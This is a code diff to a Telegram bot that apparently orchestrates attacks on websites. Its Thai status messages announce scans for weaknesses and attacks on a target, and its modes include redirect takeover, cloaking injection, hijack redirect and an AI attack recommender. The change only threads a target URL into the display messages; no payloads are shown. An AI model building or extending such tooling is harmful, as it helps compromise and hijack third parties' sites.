@@ -708,7 +708,8 @@ async function handleWithConversationState(chatId: number, text: string): Promis
           setConversationState(chatId, { targetDomain: domain, targetUrl: targetUrl || undefined });
           try {
             // Step 1: Send "scanning" message immediately
-            await sendTelegramReply(config, chatId, `🔍 กำลังสแกน ${domain} เพื่อวิเคราะห์จุดอ่อน...\n⏱️ ใช้เวลาประมาณ 10-20 วินาที`);
+            const scanDisplayTarget = targetUrl ? targetUrl.replace(/^https?:\/\//, "") : domain;
+            await sendTelegramReply(config, chatId, `🔍 กำลังสแกน ${scanDisplayTarget} เพื่อวิเคราะห์จุดอ่อน...\n⏱️ ใช้เวลาประมาณ 10-20 วินาที`);
             
             // Step 2: Run quick recon + AI recommendation (fire and forget)
             (async () => {
@@ -717,7 +718,7 @@ async function handleWithConversationState(chatId: number, text: string): Promis
                 
                 // Quick recon (15s max)
                 const recon = await Promise.race([
-                  quickRecon(domain),
+                  quickRecon(domain, targetUrl),
                   new Promise<null>((resolve) => setTimeout(() => resolve(null), 20_000)),
                 ]);
                 
@@ -803,14 +804,15 @@ async function handleWithConversationState(chatId: number, text: string): Promis
       setConversationState(chatId, { targetDomain: domain, targetUrl: targetUrl || undefined });
       try {
         // Same AI recommendation flow as direct attack
-        await sendTelegramReply(config, chatId, `🔍 กำลังสแกน ${domain} เพื่อวิเคราะห์จุดอ่อน...\n⏱️ ใช้เวลาประมาณ 10-20 วินาที`);
+        const scanDisplayTarget2 = targetUrl ? targetUrl.replace(/^https?:\/\//, "") : domain;
+        await sendTelegramReply(config, chatId, `🔍 กำลังสแกน ${scanDisplayTarget2} เพื่อวิเคราะห์จุดอ่อน...\n⏱️ ใช้เวลาประมาณ 10-20 วินาที`);
         
         (async () => {
           try {
             const { quickRecon, getAttackRecommendations, formatRecommendationMessage, buildRecommendationKeyboard } = await import("./ai-attack-recommender");
             
             const recon = await Promise.race([
-              quickRecon(domain),
+              quickRecon(domain, targetUrl),
               new Promise<null>((resolve) => setTimeout(() => resolve(null), 20_000)),
             ]);
             
@@ -5162,7 +5164,8 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       { text: "📊 สถานะ", callback_data: `attack_status:${domain}` },
     ]],
   };
-  const progressText = `\u2694\uFE0F เริ่มโจมตี ${domain}...\nMethod: ${method}\nETA: ${eta.label}\n\n\u23F3 กำลังเตรียมพร้อม...`;
+  const displayTarget = effectiveTargetUrl !== `https://${domain}` ? effectiveTargetUrl.replace(/^https?:\/\//, "") : domain;
+  const progressText = `\u2694\uFE0F เริ่มโจมตี ${displayTarget}...\nMethod: ${method}\nETA: ${eta.label}\n\n\u23F3 กำลังเตรียมพร้อม...`;
   let progressMsgId = await sendAndGetMessageId(config, chatId, progressText, stopKeyboard);
   
   // Retry up to 2 more times if first attempt fails
@@ -5182,7 +5185,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
     console.warn(`[TelegramAI] Progress message failed after 3 attempts for ${domain} — will try plain message and continue attack`);
     // Don't abort! Try sending a plain text message as fallback
     try {
-      const fallbackText = `⚔️ โจมตี ${domain} (${method})\n⏳ กำลังเริ่ม... (progress display unavailable)`;
+      const fallbackText = `⚔️ โจมตี ${displayTarget} (${method})\n⏳ กำลังเริ่ม... (progress display unavailable)`;
       const { response: fbResp } = await telegramFetch(
         `https://api.telegram.org/bot${config.botToken}/sendMessage`,
         {
@@ -5324,6 +5327,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       // ═══ NARRATED DEEP VULNERABILITY SCAN ═══
       const narrator = new TelegramNarrator({
         domain,
+        targetUrl: effectiveTargetUrl !== `https://${domain}` ? effectiveTargetUrl : undefined,
         method: "scan_only",
         botToken: config.botToken,
         chatId,
@@ -5517,6 +5521,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       // ═══ DEEP REDIRECT VULNERABILITY SCAN (9 types) ═══
       const narrator = new TelegramNarrator({
         domain,
+        targetUrl: effectiveTargetUrl !== `https://${domain}` ? effectiveTargetUrl : undefined,
         method: "deep_redirect_scan",
         botToken: config.botToken,
         chatId,
@@ -5647,6 +5652,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       // ═══ NARRATED REDIRECT TAKEOVER ═══
       const narrator = new TelegramNarrator({
         domain,
+        targetUrl: effectiveTargetUrl !== `https://${domain}` ? effectiveTargetUrl : undefined,
         method: "redirect_only",
         botToken: config.botToken,
         chatId,
@@ -5878,6 +5884,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       // ═══ NARRATED FULL CHAIN ATTACK (CASCADING FALLBACK) ═══
       const narrator = new TelegramNarrator({
         domain,
+        targetUrl: effectiveTargetUrl !== `https://${domain}` ? effectiveTargetUrl : undefined,
         method: "full_chain",
         botToken: config.botToken,
         chatId,
@@ -8100,6 +8107,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       // ═══ NARRATED AGENTIC AUTO ═══
       const narrator = new TelegramNarrator({
         domain,
+        targetUrl: effectiveTargetUrl !== `https://${domain}` ? effectiveTargetUrl : undefined,
         method: "agentic_auto",
         botToken: config.botToken,
         chatId,
@@ -8371,6 +8379,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       // ═══ NARRATED CLOAKING INJECTION ═══
       const narrator = new TelegramNarrator({
         domain,
+        targetUrl: effectiveTargetUrl !== `https://${domain}` ? effectiveTargetUrl : undefined,
         method: "cloaking_inject",
         botToken: config.botToken,
         chatId,
@@ -8564,6 +8573,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       // ═══ NARRATED HIJACK REDIRECT ═══
       const narrator = new TelegramNarrator({
         domain,
+        targetUrl: effectiveTargetUrl !== `https://${domain}` ? effectiveTargetUrl : undefined,
         method: "hijack_redirect",
         botToken: config.botToken,
         chatId,
@@ -8849,6 +8859,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       
       const narrator = new TelegramNarrator({
         domain,
+        targetUrl: effectiveTargetUrl !== `https://${domain}` ? effectiveTargetUrl : undefined,
         method: modeLabel,
         botToken: config.botToken,
         chatId,
@@ -9056,6 +9067,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       // ═══ NARRATED RETRY ATTACK ═══
       const narrator = new TelegramNarrator({
         domain,
+        targetUrl: effectiveTargetUrl !== `https://${domain}` ? effectiveTargetUrl : undefined,
         method: "Retry Attack",
         botToken: config.botToken,
         chatId,
